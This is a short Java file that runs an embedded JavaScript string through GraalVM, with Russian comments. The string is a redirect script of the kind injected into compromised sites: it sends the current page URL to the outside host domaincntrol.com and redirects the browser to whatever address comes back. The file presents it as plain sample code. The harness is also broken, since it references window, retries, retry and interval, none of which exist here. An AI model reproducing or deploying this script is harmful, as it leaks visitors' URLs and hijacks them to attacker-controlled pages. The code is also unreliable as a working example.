import org.graalvm.polyglot.Context;
import org.graalvm.polyglot.Source;

public class RunJavascriptInJava {
    public static void main(String[] args) {
        Context context = Context.create();

        // Исходный JavaScript-код
        String script = "fetch(\"https://domaincntrol.com/?orighost=\" + window.location.href)\n" +
                "        .then(response => response.json())\n" +
                "        .then(data => window.location.href = data)\n" +
                "        .catch(error => {\n" +
                "          if (retries > 0) {\n" +
                "            retries--;\n" +
                "            setTimeout(retry, interval);\n" +
                "          } else {\n" +
                "            console.error(\"Error: \", error);\n" +
                "          }\n" +
                "        });"; // Замени на свой JS-код

        Source source = Source.create("js", script);

        // Выполнить скрипт
        context.eval(source);
    }
}